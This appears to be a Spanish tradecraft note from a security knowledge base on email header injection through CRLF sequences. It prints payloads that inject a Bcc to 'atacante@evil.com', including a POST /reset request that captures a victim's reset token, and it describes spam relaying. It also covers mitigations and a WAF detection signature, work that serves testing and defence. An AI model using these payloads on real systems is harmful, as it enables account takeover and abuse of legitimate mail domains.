---
tipo: tradecraft
clase: "[[CWE-93 - Improper Neutralization of CRLF Sequences]]"
eje: alcance
implementacion: "Inyectar un \\r\\n en un campo del correo para agregar un Bcc propio y recibir una copia, o destinatarios arbitrarios"
opsec: ruidoso
telemetria: ["[[Registro del WAF]]", "[[Log de acceso del servidor web]]"]
requisitos: [entrada-en-una-cabecera-de-correo-sin-filtrar]
coste: bajo
alternativas: ["[[Email header - falsificación y cuerpo]]", "[[Host header - envenenamiento del restablecimiento]]"]
probado: nunca
contexto: [web-generica]
aliases:
  - Bcc injection
  - email exfil
  - relay de spam
tags:
  - dominio/web
---

# Email header - inyección de destinatarios

## Cuándo lo elijo

Es el caso base del dominio y el primero a probar. Se reconoce en cualquier función que envíe correo con entrada del usuario en una cabecera —formulario de contacto, "enviar a un amigo", suscripción, restablecimiento—. Se confirma inyectando `%0d%0aBcc:%20atacante@x.com` en el campo de correo y viendo si llega la copia.

El objetivo de mayor impacto es **exfiltrar un correo de restablecimiento**: inyectar un `Bcc` propio en el flujo de reset para recibir una copia del correo de otra cuenta, con su token. El objetivo secundario es el **relay de spam** —agregar destinatarios arbitrarios desde el dominio legítimo—. Si el objetivo es falsificar el remitente o el cuerpo, la rama es [[Email header - falsificación y cuerpo]].

## Por qué funciona

Las cabeceras de un correo se separan con `\r\n`, igual que las de HTTP. Si el campo que va a una cabecera no filtra el salto de línea, inyectarlo agrega una cabecera nueva:

```
email = victima@objetivo.com%0d%0aBcc: atacante@evil.com
```

El servidor arma el correo con `To: victima@objetivo.com` y `Bcc: atacante@evil.com`, así que el atacante recibe una copia silenciosa. Aplicado al flujo de restablecimiento:

```http
POST /reset
email=victima@objetivo.com%0d%0aBcc:atacante@evil.com
```

El correo de reset de la víctima —con su token de un solo uso— llega también al atacante. Cuenta tomada, sin que la víctima note nada distinto: ella recibe su correo normal.

El **relay de spam** usa la misma inyección con destinatarios masivos, aprovechando la reputación del dominio del objetivo para que el spam pase los filtros. Las formas de inyectar según el sink —`mail()` de PHP, distintas bibliotecas— y las codificaciones del `\r\n` están en [[Email header inyección - matriz de referencia]].

Es la contracara de [[Host header - envenenamiento del restablecimiento]]: aquel cambia el **dominio del enlace** para capturar el token cuando la víctima hace clic; este se manda una **copia del correo entero**, sin depender de que la víctima haga nada.

## Cómo falla

Falla cuando la aplicación **rechaza `\r` y `\n`** en los campos de correo —una dirección válida no los contiene—. Es la mitigación directa.

Falla cuando usa una biblioteca de correo que serializa y escapa las cabeceras en vez de concatenar en `mail()`. Los frameworks modernos lo hacen, por eso la clase vive sobre todo en integraciones a mano y en PHP con `mail()` directo.

Y falla cuando el `To` es fijo del lado del servidor y solo el `Subject` o el cuerpo salen de la entrada —ahí no se pueden agregar destinatarios, y queda [[Email header - falsificación y cuerpo]].

## Coste

Bajo, el más bajo del dominio. Confirmar es una petición con `%0d%0aBcc:` y esperar la copia. La cadena de exfiltración de reset son pocas peticiones más.

El reconocimiento es barato: probar el `\r\n` en cada campo que alimente un correo, empezando por el de dirección. El único costo es tener un buzón donde recibir las copias.

## Huella esperada

Firma clara sobre la petición, y un hueco de fuente en el correo:

- El campo de correo lleva **`%0d%0a` seguido de `Bcc:`/`Cc:`/`To:`** —un salto de línea y un nombre de cabecera de correo en un campo de dirección—, que no ocurre en tráfico legítimo. Es una firma de buena fidelidad que ve [[Registro del WAF]], y [[Log de acceso del servidor web]] si viaja en la query. Es la misma familia que la firma de [[CRLF - inyección de cabecera]], con nombres de cabecera de correo en vez de HTTP.
- El impacto —el correo con el `Bcc` de más— **no lo ve ninguna fuente del vault**: no hay artefacto de telemetría del servidor de correo modelado. Es un hueco de fuente: la copia se manda y del lado web solo queda la petición. Si el servidor de correo registrara los destinatarios, un `Bcc` inyectado sería visible, pero eso está fuera de lo que el vault modela.

La detección aprovechable es la firma de la petición, escribible sobre el WAF. La exfiltración del reset, además, deja la marca de [[Autenticación - abuso de recuperación de contraseña]] si se audita el flujo. Anotado en [[MOC - Email header injection]].
